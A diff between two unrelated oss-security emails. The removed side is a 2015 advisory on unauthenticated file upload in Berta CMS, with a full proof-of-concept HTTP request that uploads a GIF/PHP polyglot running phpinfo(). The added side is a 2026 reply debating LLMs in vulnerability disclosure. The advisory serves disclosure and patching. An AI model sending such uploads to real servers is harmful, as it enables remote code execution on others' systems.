@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["7526" "Friday" "27" "March" "2015" "10:18:34" "+0000" "Simon Waters" "simon.waters@surevine.com" "<C6303836-0701-4577-A248-53800051FE45@surevine.com>" "143" "[oss-security] Fwd: Insecure file upload in Berta CMS" nil nil nil "3" "2015032710:18:34" "[oss-security] Fwd: Insecure file upload in Berta CMS" (number mark "        simon.waters Mar 27  143/7526  " thread-indent "\"[oss-security] Fwd: Insecure file upload in Berta CMS\"\n") "<F9EED012-4100-4170-8C48-FF3050869169@surevine.com>" ("<F9EED012-4100-4170-8C48-FF3050869169@surevine.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0001
-X-Mozilla-Status2: 00000000
-Received: (qmail 32269 invoked by uid 550); 27 Mar 2015 14:02:24 -0000
+Received: (qmail 3754 invoked by uid 550); 15 May 2026 19:30:19 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,173 +6,187 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 32026 invoked from network); 27 Mar 2015 10:18:48 -0000
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20130820;
-        h=x-gm-message-state:from:content-type:content-transfer-encoding
-         :subject:date:references:to:message-id:mime-version;
-        bh=mAEjBVmf13LWttxK624hR0C2woFBuN4CCZIAoMkz6eI=;
-        b=PExLGevleSDg7oMh7UDQp/j28XnwFosSgmKYmwdmpOcZYiikSoqaJMBMdjVZ7eCuRp
-         ISmvypzBAktQhNx8oRuGZtoNTYLnzMUNNay1vCiV/AInzqEFRXs190OEbd7kGTOJjiA6
-         1cdu/6jiObjauFYb602wreTY1KNskVXm3N2fgxKsUscdN9Qmd+d+YHOxb6mAXkUAvnTy
-         F8W1Obl3yRF2q37B/owMAHfi1HDxJXYCL+rm+bnn9HtQ5rC0gTQx3GSSZr6dYGJEQPrT
-         GTVkZx3uiaYLFwCVDJUkISIv+92IXcvaI2E9AIG2VjtuuKg3UNDbpdFbBQo5o6H9jXzR
-         UrRg==
-X-Gm-Message-State: ALoCoQnZfuJoW89NL1BPbnctkfFv5toQitmEZxujpWdCAXwRXHec+XOVblzXbriV6SkWbNhEKs0e
-X-Received: by 10.180.79.65 with SMTP id h1mr55663036wix.59.1427451517304;
-        Fri, 27 Mar 2015 03:18:37 -0700 (PDT)
-Content-Type: text/plain; charset=utf-8
-Content-Transfer-Encoding: quoted-printable
-References: <F9EED012-4100-4170-8C48-FF3050869169@surevine.com>
-Message-Id: <C6303836-0701-4577-A248-53800051FE45@surevine.com>
-Mime-Version: 1.0 (Mac OS X Mail 8.2 \(2070.6\))
-X-Mailer: Apple Mail (2.2070.6)
-Date: Fri, 27 Mar 2015 10:18:34 +0000
-From: Simon Waters <simon.waters@surevine.com>
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] Fwd: Insecure file upload in Berta CMS
-To: oss-security@lists.openwall.com
+x-ms-reactions: disallow
+Received: (qmail 20231 invoked from network); 15 May 2026 15:28:08 -0000
+ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
+ b=Cmhe7nNZ6E5PJN3lqYPGqqI0Au+qTac3HfeC0Kwlks/s3Ci1IM19tf7nxM7/RkGv4XW5fA+p2U3RNt0j2DuaE4SSgZCCPE+ko43hjEmH4qcdMz5uMhvWTQnubldHCzDZJrqgAHDQAZalrFBYxnAsDtORmnYmNV4tFLFn94vCjUk+oatapPlEeHZokLJutO9CvHByQL5aMkT/AkGYPFOjOUfE48sEYpPxIEA9UW9tyic0YWjBeB5gNt57KVSpSdBxXArN5WP/0n6p42ABHPBHN/FBetbUR/KltaIAHqPZM0/rUfOv5Qsj7i1/oBQ7DiT0YaWoFK/bu2Wmiv9t4T4rVQ==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
+ s=arcselector10001;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
+ bh=katEiMT3MIjnTOBSWnecpQPVKpDXZjWPz+lAvD/IEqI=;
+ b=N4vRsKpkMnw9yhDvwcwTp03UjGKA48ZMgGgo8BNF+PWXErvwP2ASkMYJUDGlEHFVHaaFPPNZ92sViKifILu1f/GR5AZm3c3uaqS10phG8KL1RPCpFtegL4db3JPu/zZTpkKrGWRPfd/ZjIuIHyIhN1n1QbYuyJQ/17+eorhDOe3NBmE8sZT+h50I1eQgzjApkpZPlQ6cjPt3Pj1+GZ4nfs8p9rlauOWWkPaL5zDgnmXYSiWZ95cNdQxtOCKcr+wz/ucZWKFoklyF9X9DnZQK2pWrm90paoxlXOLy2ypiGzZ01MbZcf7FMFz4/x+aAvtlF+DH4vhQFumAU+lU4ewCfg==
+ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=none; dmarc=none;
+ dkim=none; arc=none
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=hotmail.com;
+ s=selector1;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
+ bh=katEiMT3MIjnTOBSWnecpQPVKpDXZjWPz+lAvD/IEqI=;
+ b=lQAhoH0AtCdToMtoKgNyPCB2zBpACzXz4leiwJyh6ribi+QbXWPkB7eH1ASzJcreaKb6pyWNnfTX3sygnPBmxuLF0dLpCYm0+NBQhK6qlP/21rHaMZe93lfl2rHTwkuvAj+Nn0YpKFpZpuh85FhEm+c8SXMMJkOR1CYomN6wBPIk13TiXn6PzvFR+ZJKEgoqCFIt3uT0Xybx2LXGKIQ6tf6a67Lc/EGJ0zwa0675Q8Loh9hnk1UCq5UZHGUtqANqFwLHHpfI3tc+U71uaL+cshyjIXkH3JqNaXbN+IHAVJX16aGz9qtb11Wcu9hNCMBJae83AIXLaZdF/SCKfY2Tew==
+From: Markus Klyver <markusklyver@hotmail.com>
+To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
+Thread-Topic: [oss-security] Coordinated Disclosure in the LLM Age
+Thread-Index: AQHc1x/KZqhPb+GP502N8+vd+qYyoLYJrU4AgAWhlJ8=
+Date: Fri, 15 May 2026 15:27:57 +0000
+Message-ID:
+ <FRWP189MB3328A68F0DA5B59C7740E411C3042@FRWP189MB3328.EURP189.PROD.OUTLOOK.COM>
+References: <afDLFWVMK-r70PB0@yuggoth.org>
+ <19e19c71ce3.89e18d29194892.4293867009907644019@roiai.ca>
+In-Reply-To: <19e19c71ce3.89e18d29194892.4293867009907644019@roiai.ca>
+Accept-Language: sv-SE, en-US
+Content-Language: sv-SE
+X-MS-Has-Attach:
+X-MS-TNEF-Correlator:
+msip_labels:
+x-ms-exchange-messagesentrepresentingtype: 1
+x-ms-publictraffictype: Email
+x-ms-traffictypediagnostic: FRWP189MB3328:EE_|DU0P189MB1939:EE_
+x-ms-office365-filtering-correlation-id: 15314fda-0d3a-4b04-ff8a-08deb2968ad4
+x-microsoft-antispam:
+ BCL:0;ARA:14566002|10092599007|15080799012|19110799012|15030799006|31061999003|21061999006|24071999003|8060799015|8062599012|20031999006|25031999004|34061999003|24021099003|55001999006|37011999003|30051999003|39105399006|3412199025|440099028|12091999003|102099032|35041999009|40105399003;
+x-microsoft-antispam-message-info:
+ =?iso-8859-1?Q?A7s3rEAiuCZaxR3YDN1gGe8agq1x5XDpa4T4/pfksZXZHW2RoeEO3kUkeY?=
+ =?iso-8859-1?Q?DpfYhfYZCRqUYHnmUYH4fYvm3AlDK4lEhbhGZysyo+CpATKV2q0oidMgFG?=
+ =?iso-8859-1?Q?z2rzJdUUNz4TR33LzD+rwnglkPeRHDkhSSTcMeOAsXJZqCBw/pDsM4KLUc?=
+ =?iso-8859-1?Q?l6BHEJv88vEq8q8zySSpTvsnSSkMrWHEKMt3SKZvs655vsmrmy/Ad41Xmj?=
+ =?iso-8859-1?Q?rZK8+ja3wMa3w/AnM9EaZ6C4iwL+7bzSbW0CwnOme8sGEjl8AGrWJPmC44?=
+ =?iso-8859-1?Q?Tx1AXJjuPZEAALAm4zXcovZrUdHy7tE+ia6LgVw8s+IhhvKBaL9wMmM4mF?=
+ =?iso-8859-1?Q?LiLhRkwvIb2/BZgRABwBxJN4joFCAcCsUFOlxgcg5HXoUpQffiy2lyKoIj?=
+ =?iso-8859-1?Q?L4yRm83e7OrBqdo/bv4dh8b2b7x1bTYqgpc4jA5juyBNgR+Gds0ZTJBCqi?=
+ =?iso-8859-1?Q?jznx4U9QHnTW9jkKUvnCmAh6qs3qHFjSZ4NoDWvVeAuBhbYEuGE23j8JR1?=
+ =?iso-8859-1?Q?bXi0rpmACMeYy4cKJMiXgM1nhfr9CHupcRjuUABQwu/X4AXIsj/NOYPJIY?=
+ =?iso-8859-1?Q?+/CN26NkFp8BFuZatkrBaCwqMmT+HfY8hTgbReRW7CKJ3zks2Suq0cT8Wp?=
+ =?iso-8859-1?Q?jidGTB2RkmN61xANqVD0QTrKqK1awImyNmEqYCWjN4MaBvzUs6HAPy1bLT?=
+ =?iso-8859-1?Q?dfyj8/SCljsd4asm7EGUxPTCPaRChbuHYOPAnt/4S2cUCHvOL6KTeMJSYQ?=
+ =?iso-8859-1?Q?gjzi1cLXeyIUGKVEvtW488Rrj7gwcafW7pkKbm1qUQWxwy6s2KUlGfoDxE?=
+ =?iso-8859-1?Q?hhuwjuogMJNxLfc0eQNKsyEiPANwfM+zNgXFrdfRRauWqthNALxz938Dhv?=
+ =?iso-8859-1?Q?0aJBtq0JEZeqpiFEQsvnjGKA2m6+bcwxxQqjZVzhG+rYGl13YgsMlKAEcu?=
+ =?iso-8859-1?Q?+Uniz6Q5zdBcdlzhQqJnDuyTVtYSZmbzaQhFN19nwGoWOSU6s+kaMuON8B?=
+ =?iso-8859-1?Q?zUV943UBTgExJPEsdbK0xm8wfPJFSjQl8ITYLPoVqiiURerEXKo0MxMuV5?=
+ =?iso-8859-1?Q?eMqWD5jfoq1j7EVxA3ac2pwuAtH4Dn31iZkYz+qE+da7ueViMjjEj48g5B?=
+ =?iso-8859-1?Q?eBHeVLt9mLKukLeYWrn8EMuJ3kt+oDrmbwpkZW2GmOa1UBVBeAvd34Fy46?=
+ =?iso-8859-1?Q?YU+F/6RfajizWZaASpi43JO1AfY06SJzjLB6GvDX0USMEWEMeY9yfZnD+z?=
+ =?iso-8859-1?Q?/p1UvBRbGgT6qytrwbogcu91P1VP5RCr0BQY03l+HtTOH1VUNw5QbDocAs?=
+ =?iso-8859-1?Q?vRJ4r92DZb0Tqn0wk0Ln3RIHb73zHXvWeNDb7eUhb8O0pgdpTmBvFGTkJa?=
+ =?iso-8859-1?Q?U+SWgKr5vA?=
+x-ms-exchange-antispam-messagedata-chunkcount: 1
+x-ms-exchange-antispam-messagedata-0:
+ =?iso-8859-1?Q?g+OMR5qcsatJOo5OtTYp7e7TTYu2Tho0TuTpmRxetx6IdLj02eoCjsMr+F?=
+ =?iso-8859-1?Q?b6Whc36MgojJ7q0hSiaP4GrA6KzTi/IIt3pwGLUpYhJTwyhZuMwkgmbkdP?=
+ =?iso-8859-1?Q?Asik4hLLf6CsAWFlOZzIG+zp0nF4NsG3cMZO1QLhIILzup36wEb7ErIVC5?=
+ =?iso-8859-1?Q?KTroc36RBPpp3nWJm0QBrUBFXESP/soHOCYCrAd18ry7PCOPYePJhXvNMC?=
+ =?iso-8859-1?Q?A1PQ5rHLogQKVPdETEKkFaf0TkSTENugvn66ptsAPPO/8GHFCacjgOJfRo?=
+ =?iso-8859-1?Q?HoPNp8CxCXlvrahpnG94yGXaFh3Gyh8LhzSpkq9aqfJOAWknQ2eeIfEj3R?=
+ =?iso-8859-1?Q?EBllfADCjNQMTkPlhfTF9mShfk6n64kxRtXtXrsURQqhbro/uHasL7619C?=
+ =?iso-8859-1?Q?TrLtW+ls6k7xyegskC7ZdEcs3rzl0ei8Ukwgd/0YwnD1MpnZzg/135HiHf?=
+ =?iso-8859-1?Q?KrYvABVTjyBurRXgYBzW0Beax++qK5iUJOtEPgBc18qZ5cMPQYaUjOIuN4?=
+ =?iso-8859-1?Q?OKD9Y16Wd5i18pvSKAvmM3RnXLPsxeWjAIVIOIlnR9xWst5iwfhsYX17Og?=
+ =?iso-8859-1?Q?N22Sus/FOoBLQ3EL8c15OVgAB8YxwAU5/H2Z06vo71qpB3RuAGsOScqq0W?=
+ =?iso-8859-1?Q?a68TuntvPZ8Qv/jjxX+YtX6q0YPlXaRfu1E+kGT7fQ+bagx5eeojyxe5Z7?=
+ =?iso-8859-1?Q?EKQD6XG5LuxK8d6w98YEkDFAzC+Gt+INlYNXaMoObGZYXD3ezjJE155uUo?=
+ =?iso-8859-1?Q?prPo41tAf1DPA9ZPx7ospGuOMSI9iYn8BsQGzuggGl/aw815rxSyJ2DTHT?=
+ =?iso-8859-1?Q?YKudEh5cjSwCHxTCdYT5YtPXl4/gr6YpmXNeQjEPztok2i96d1Z+E75qv3?=
+ =?iso-8859-1?Q?PSaVWH3W5kbWwUcVCSkFhgsMO+w7twKCLnogPCrqxlckqsJ0EjVjCiOvgk?=
+ =?iso-8859-1?Q?AeEI9FhrgT5bcnijbyHNpqXkE60L324xXypdjtfA6UDDJp+fZ87jZU+Sc3?=
+ =?iso-8859-1?Q?mT00PXUDsrb6gJDOLyFeMr8i/WevgpNomxlWnjz9xKnnZ9syoKxY6NRLyU?=
+ =?iso-8859-1?Q?ayPpFfUz2EoQGLxrZuWWsQ1SmX1aOpfpMHwn3eLHNDa4Oj9s1gHbQ3KTgX?=
+ =?iso-8859-1?Q?U66j05QGJiV1uY4X0vStzrAd5sYerzfPxCqEEk7D5EBeo/oJCRwSh9Yd60?=
+ =?iso-8859-1?Q?KxJSMGFr5l6/ft6Og2+VQJXKMrZc+Zh6g3vQDWOyAQiHqBlVTUZ2EsYqQW?=
+ =?iso-8859-1?Q?qmhSR/uWG/QbuRNRzsFJ2IqTYYEsgw7Yp76q6WZZ4R0UoWnPZLIUMHYJ1B?=
+ =?iso-8859-1?Q?8LVrBbRt4P5LPikrjOGskOPd/0ceIqfEriRlajehOsPpDsEwkyh/wLk5Q9?=
+ =?iso-8859-1?Q?MO+jhg4ZYNoxgYPinULINYZX01f0MxIczuW937JNUwvbC+LmS21Jpz0Prw?=
+ =?iso-8859-1?Q?JvizQi4vPO0vkmNQbscZBSXcFTtSpRD+3Gm191SrMpnhMr0BLjbfog4cuA?=
+ =?iso-8859-1?Q?uPUHVcsnuS2esiFCO5/uFU?=
+Content-Type: multipart/alternative;
+	boundary="_000_FRWP189MB3328A68F0DA5B59C7740E411C3042FRWP189MB3328EURP_"
+MIME-Version: 1.0
+X-OriginatorOrg: sct-15-20-9412-4-msonline-outlook-b25a6.templateTenant
+X-MS-Exchange-CrossTenant-AuthAs: Internal
+X-MS-Exchange-CrossTenant-AuthSource: FRWP189MB3328.EURP189.PROD.OUTLOOK.COM
+X-MS-Exchange-CrossTenant-RMS-PersistedConsumerOrg: 00000000-0000-0000-0000-000000000000
+X-MS-Exchange-CrossTenant-Network-Message-Id: 15314fda-0d3a-4b04-ff8a-08deb2968ad4
+X-MS-Exchange-CrossTenant-originalarrivaltime: 15 May 2026 15:27:57.6695
+ (UTC)
+X-MS-Exchange-CrossTenant-fromentityheader: Hosted
+X-MS-Exchange-CrossTenant-id: 84df9e7f-e9f6-40af-b435-aaaaaaaaaaaa
+X-MS-Exchange-CrossTenant-rms-persistedconsumerorg: 00000000-0000-0000-0000-000000000000
+X-MS-Exchange-Transport-CrossTenantHeadersStamped: DU0P189MB1939
+Subject: Sv: [oss-security] Coordinated Disclosure in the LLM Age
 
-Can a CVE id be allocated for this?
+--_000_FRWP189MB3328A68F0DA5B59C7740E411C3042FRWP189MB3328EURP_
+Content-Type: text/plain; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+If you want to process your all your internal thoughts and personality thro=
+ugh a statistical probabilistic function, then you are of course absolutely=
+ entire free to do so. But please keep in mind that LLMs are also overloadi=
+ng open source projects with fake PRs and "fixes" that ruin the codebase (d=
+o I have to mention ffmpeg and curl?), the code quality and the lives of ev=
+eryone.
+
+If an LLM is used to find potential bugs, it is up to you to ensure it is a=
+ real bug and that you can replicate the behavior. Offloading that part to =
+the LLM and the need for human knowledge is a loss for everyone involved.
+________________________________
+Fr=E5n: Tim Shephard <tim@roiai.ca>
+Skickat: den 12 maj 2026 03:22
+Till: oss-security <oss-security@lists.openwall.com>; fungi <fungi@yuggoth.=
+org>
+=C4mne: Re: [oss-security] Coordinated Disclosure in the LLM Age
+
+Thanks for starting this discussion.  I have reported a number of issues re=
+cently, including - #2149789,  #2150261,  #2149775,  #2150316 - three of wh=
+ich are identified by the team as critical, and one as high.  The oslo rabb=
+it MITM is also critical, IMHO, but I agree it cannot be fixed without pote=
+ntially breaking many poorly configured deployments and so must be 'Class B=
+'.  An awkward situation to be sure, but the solution is understandable.
+
+For what it's worth my goal is not to 'mine security gold', rather I am try=
+ing to find and test potential solutions for sovereign cloud.
 
 
-> Begin forwarded message:
->=20
-> From: Simon Waters <simon.waters@surevine.com>
-> Subject: Insecure file upload in Berta CMS
-> Date: 26 March 2015 18:01:09 GMT
-> To: bugtraq@securityfocus.com, fulldisclosure@seclists.org
->=20
-> Berta CMS is a web based content management system using PHP and local fi=
-le storage.
->=20
-> http://www.berta.me/
->=20
-> Due to use of a 3rd party Berta CMS website to redirect links within a ph=
-ishing email brought to our attention we checked the file upload functional=
-ity of this software.
->=20
-> We found that the file upload didn't require authentication.
->=20
-> Images with a ".php" extension could be uploaded, and all that was requir=
-ed is that they pass the PHP getimagesize() function and have suitable dime=
-nsions.
->=20
-> It is possible for GIF image files (and possibly other image files - not =
-tested) to contain arbitrary PHP whilst being well enough formed to pass th=
-e getimagesize() function with acceptable dimensions.
->=20
-> http://ha.ckers.org/blog/20070604/passing-malicious-php-through-getimages=
-ize/ <http://ha.ckers.org/blog/20070604/passing-malicious-php-through-getim=
-agesize/>
->=20
-> We can't ascertain if this is the weakness that was used to compromise th=
-e 3rd party server in question, however the patch requires authentication f=
-or all file uploads, which will likely resolve any similar issues.
->=20
-> The author was notified: 2015-03-22
-> Author Acknowledge: 2015-03-23
-> Patch released: 2015-03-26
->=20
-> The berta-0.8.10b.zip file from: http://www.berta.me/download/  includes =
-a fix that requires authentication to upload files.
->=20
->=20
-> This announcement should not be interpreted as implying either the author=
-, or Surevine, have conducted any in-depth assessment of the suitability of=
- Berta CMS for any purpose (Sometimes you just want to make life harder for=
- those sending phishing emails).
->=20
->=20
-> The following POST request will upload a c.php file which will run phpinf=
-o() when fetched on vulnerable servers.
->=20
-> POST /engine/upload.php?entry=3Dtrue&mediafolder=3D.all HTTP/1.1
-> Host: 192.168.56.101
-> User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:36.0) Gecko/=
-20100101 Firefox/36.0
-> Accept: text/html,application/xhtml+xml,application/xml;q=3D0.9,*/*;q=3D0=
-.8
-> Accept-Language: en-US,en;q=3D0.5
-> Accept-Encoding: gzip, deflate
-> Referer: http://192.168.56.101/upload.html
-> Connection: keep-alive
-> Content-Type: multipart/form-data; boundary=3D---------------------------=
-2147563051636691175750543802
-> Content-Length: 1617
->=20
-> -----------------------------2147563051636691175750543802
-> Content-Disposition: form-data; name=3D"Filedata"; filename=3D"c.php"
-> Content-Type: text/php
->=20
-> GIF89/* < =C2=B3 =C3=BF=C3=BF=C3=BFfff=C3=8C=C3=8C=C3=8C333=C3=8C=C3=BF=
-=C3=BF=E2=84=A2=E2=84=A2=E2=84=A23ff=C3=8C=C3=8C=C3=BF=C3=8C=C3=BF=C3=8C=E2=
-=84=A2=E2=84=A2=C3=8Cf3f 33 f=E2=84=A2=E2=84=A23 3 3!=C3=BE GIF SmartSaver =
-Ver1.1a , =C3=88 < =C3=BE =C3=88I=C2=AB=C2=BD8=C3=AB=C3=8D=C2=BB=C3=BF`(=C5=
-=BDdi=C5=BEh=C2=AA=C2=AEl=C3=AB=C2=BEp,=C3=8Ftm=C3=9Fx=C2=AE=C3=AF|=C3=AF=
-=C3=BF=C3=80 p=C2=B8 =C3=88=C2=A4r=E2=84=A2$=C3=B6=CB=9C 4=C3=AA=C2=ACZ=C2=
-=AF=C3=95 c=C3=8B=C3=ADz=C2=BF`n { =E2=80=9E 2-xLn=C2=BB=C3=9F=C3=A9=C2=B3|=
-=C3=8E`=C2=AB =C2=BC^O6=E2=80=A1=C3=A3kp=E2=80=9A=C6=92=E2=80=9E#jt=CB=86]v=
-)~`}g=E2=82=AC_=E2=80=B9=E2=80=A6=E2=80=9D=E2=80=A2=E2=80=A2=E2=80=A1=E2=80=
-=B0=E2=80=B0=E2=80=9C' _ 1=CB=9C=C5=A0=E2=80=93=C2=A4=C2=A5=E2=80=9A=C2=A2=
-=E2=84=A2s=E2=80=BA& ^=C5=B8=C5=BD=C2=A1a=C2=AB=C2=A6=C2=B4=C2=B5?=C2=A8=C2=
-=A9g=C2=B3$=C2=AD]=C2=AF=C5=BE=C2=B1 =C2=B6=C3=83=C3=84<=C2=B8=C2=B9=C3=82w=
- X=C2=BD\=E2=80=98^=C2=BB=C3=85=C3=92=C3=93+=C3=87=C3=88=C3=90,=C3=8D[=C3=
-=94%=C3=87=C3=91=C3=9C=C3=A0=C3=A1)=C3=96=C3=9F=C3=99=C3=8B=C3=A2 =C3=9E=C3=
-=A8=C3=AB=C3=AC'=C3=A4e=C3=A7 M=C3=8CJ =C3=AA=C3=AD=C3=B8=C3=B9=C3=B6=C2=BA=
- x{{ =C3=BC=C3=BD P=E2=82=AC=E2=80=9A64=20
-> =C3=B0Vp=C3=83@> 8P=C6=92=C3=843 R=C2=B1pO=C5=B8=C3=87 =C3=BE =C3=9EU8=CB=
-=9C!@=CB=9C (SbL9 a =E2=80=9C=C5=A16Z8=C2=B7=C2=B0 =C3=89 03 )=C2=A1#=C3=88=
-=C5=B8=C3=B8D =C5=92=C3=B7=C3=B2=C3=A4=C2=B5I =C2=AC qY RN=E2=80=BAD $=C2=
-=BD=C3=86=E2=82=AC=C2=A7O X=C3=85	 p =C2=A7Qd=E2=80=B9
-> P=C2=ADs c=CB=9C=C2=AE &=E2=80=99y5=C2=AB=C3=9Bi[=C3=93F =C3=B0=C2=B4=E2=
-=80=B9R~ =C3=84=C5=BD%=C3=9B4 Z {=C2=B7=0C =C3=90=C3=B6=C2=ADa[q=C2=A5=C3=
-=8E=E2=80=A2P=E2=80=94=C3=8B]Yy o=E2=84=A2=E2=80=9E=0Cmc/*=C3=A5l,|=C2=B83=
-=C2=A9=C3=84 )\f=C3=B0X=CB=9Cd.L+=C3=87=E2=80=9C=C3=83 =C3=80h=C2=BE 8{=C5=
-=BEM =C3=B4b=C3=97'=E2=80=A1=E2=80=9A**G=C3=A3E=C5=92 T=C3=AF>=C3=98=C2=BAg=
-n=C3=A3=C3=89h+/d{=C2=B7=E2=80=A6=C3=91=C6=92=C2=B9FU;=C3=B19=C3=AB	=E2=80=
-=B0Xv} A/=C2=AC=C3=98 =E2=80=94=E2=80=B9 =C3=94=C3=BC=C2=BBu0=C3=91=C3=A5:g=
-=0C =C3=83=C3=AB=C3=B4=C2=AAxv-=C3=80=E2=80=99=C3=A5=C2=AC=C2=AE=C2=B2=C3=
-=87=C3=AB'R =CB=9CW=C3=B4=C2=BA=E2=84=A2=C3=BE' f XC=C3=85u=C3=BD=C3=9C=C3=
-=86 ~=C3=A1=C3=AD=C3=A7 =C3=BD=C2=B9=C3=A2=C3=9Eq=C3=AA	x=C3=907=C3=9E}=C3=
-=91P{	=C2=AE=C3=A7 =C3=96=E2=80=9E=C3=94=C3=A0=C6=92$
-> =C2=A1/ (=C3=9Dz zQ=C3=9CL=C3=A1=C3=A1=C3=95=C2=A1=E2=82=AC =C3=BD6=E2=80=
-=A1=CB=86=C3=89=E2=80=A2=C2=A8c ':=E2=80=9C=C3=A2 =C3=A9)=C2=B6 w =C3=9D <=
-=C2=ADH=C2=A3A5=C3=A5=E2=80=9A=C2=A3$;F=C3=89=C2=A3=C5=92J=C3=BAw Z	=C5=BE=
-=C5=A0 -=C6=92$ =C2=A1I=C3=B5 "Ob#=C3=A5=E2=84=A28=C3=B4=C2=B8=C3=8D =CB=9C=
-e)a=E2=84=A2vu@=C3=A4=E2=80=94 =E2=80=9E6f"p=C5=A0 =C3=A6=C5=BE5=C2=A8=E2=
-=80=B0=C3=90 XV=C3=B9&r v=09
-> 3jy'=C5=BE=E2=80=9E=C5=A1=C3=89=C3=A7=C2=A3/=C3=B8Y =E2=80=A6B
-> h=C2=A4=C5=93^=C5=BE f<=E2=80=B9=E2=80=99FP=E2=80=B9(n	%=C2=A4=C2=A4=C2=
-=B2 )=E2=80=BAq
-> *{\j0=C2=A7=C2=A6u=C5=BE *f;=C2=A9=C3=AA=C2=A3=C2=A8=C5=BD=E2=80=93=C2=AA=
-=C2=AB	=C2=A7 =C3=9A=C2=A6=C2=ADk=C3=92=C2=A5`=C5=BE=E2=80=9A
-> k=C2=A2oZ=C3=93 =C2=B2=C2=A1=C3=BE=C3=A6=C2=B7=C3=AB=C2=B3 =C3=B4z=C3=A5=
-=C2=AF j9=C3=AB /=C2=BA9*/<?php phpinfo(); ?>/*
-> `=C3=87=C5=BD=C2=B4=C3=8C=C2=B5=C2=B0U .=C2=B1=C3=A1Bk=C3=AE>#V=C3=ABE=E2=
-=80=99 =C2=A6=C2=AA=C3=AE=C2=AA=E2=80=A2 =C5=A0j v=C2=AB=C2=AD =C2=A3=C3=AD=
- =C2=B9=C3=A5=C5=93=C3=AB/=C2=AE=C2=B9=C2=BE=E2=80=B9 =C3=86;h=C2=BB6 D =C2=
-=B7`=C2=B0k0=C5=A0=C3=87 H=C2=A1=C2=B3=C3=BF=C3=BA=E2=80=BA =C3=83=C3=B2N n=
- =C3=84=C3=B1f/=C2=B9=C2=A4a=C3=B7=C2=B1=C3=80kF=C3=9C =E2=80=A1 Wl=C3=AE=
-=C3=85=C3=8A=C3=8A4f c=C2=B6Q s=C2=B46 =C2=A2=CB=86z =C3=8A1/R=C3=87=C2=AF=
-=C3=8A@Wp=C3=B1 =E2=84=A2=C3=89 =C2=B3&=C2=B8 =C2=AD=C3=87]A=C3=A6|=C3=AF=
-=C5=A1=C2=AF=C3=B1 n=C2=B1 O =C3=B4=C3=95 o+=C3=AEi! =E2=80=A0 =C2=A5!"=E2=
-=80=9C=C3=93=C3=80"4=C3=B5 =C2=A5=E2=80=942=C3=96=C2=A4^ =C3=B3X0w=C3=8A=E2=
-=80=A0Z=E2=84=A2=C2=B4F6=C3=89 r=C3=9Du=C3=96V=C2=B3=C2=AD=C2=B2=C3=9B =C3=
-=92 =C3=B3=C3=94z=C3=A2 Hqw?|k=C3=A0=E2=80=9A=C3=BF=C3=ACw=C3=85n=C3=B3=C3=
-=BDU=C3=86=E2=80=99k=C2=AD=C3=B8=C3=A1=E2=80=A1e |=C3=B9=C5=B8=E2=80=A2=C2=
-=A37=C5=A1=C3=A3 [L%G=E2=80=9A=C3=A3A=C2=A9=C3=A1}=E2=80=B9=E2=80=93Ku=E2=
-=84=A27=C2=BC=C3=A9za q- k=E2=80=A1=C5=BDf=C3=A4=C2=AC=E2=80=A0=C2=B7=C2=AF=
-=C2=AF=C2=A3=C5=BD=C3=94=C3=A9=C2=B2 $n=C3=A7 =C3=80k v=C2=BA=C2=B6'o D(=C3=
-=A5=C3=A1=C2=B0<
-> =C3=A9Q=E2=82=AC `=C2=A3` q}F=C3=99*=C3=AF=C3=BD=C3=B7=C3=A0=E2=80=A1/=C3=
-=BE=C3=B8=C3=A4=E2=80=94o=C3=BE=C3=B9=C3=A8=C2=A7=C2=AF=C3=BE=C3=BA=C3=AC=
-=C2=B7=C3=AF=C3=BE=C3=BB=C3=B0=C3=87/=C3=BF=C3=BC=C3=B4=C3=97o=C3=BF=C3=BD=
-=C3=B8=C3=A7=C2=AF=C3=BF=C3=BE=C3=BC=C3=B7=C3=AF=C3=BF=C3=BF =0C ;
->=20
-> -----------------------------2147563051636691175750543802
-> Content-Disposition: form-data; name=3D"submit"
->=20
-> Upload Image
-> -----------------------------2147563051636691175750543802--
 
+More to the point of the thread, I think there is also a more pressing issu=
+e adjacent to the disclosure-process question: large, long-lived projects s=
+uch as OpenStack have a substantial backlog of legacy vulnerabilities and i=
+nsecure patterns that are now becoming much easier to discover with LLM ass=
+istance.
+
+That changes the risk calculation. Issues that previously required deep pro=
+ject knowledge, persistence, or specialized tooling may now be within reach=
+ of many more people. We should assume adversaries can use the same leverag=
+e, including for insider attacks and for chaining individually modest bugs =
+across trust boundaries.
+
+In that sense, this feels like a generational security event. The urgent qu=
+estion is not only whether embargoed details might leak through LLM use, bu=
+t whether maintainers can harden exposed systems faster than attackers can =
+rediscover and combine old weaknesses.
+
+That argues for shorter exposure windows, more proactive hardening, and mor=
+e attention to eliminating vulnerable patterns before they become practical=
+ attack paths.
+
+Furthermore, it argues for assertive use of modern LLMs, especially for cod=
+e review and vulnerability discovery. I have volunteered to help with this =
+for the OpenStack VMT, and would be happy to do so again here.
+
+
+
+Cheers,
+
+
+
+Tim.
+
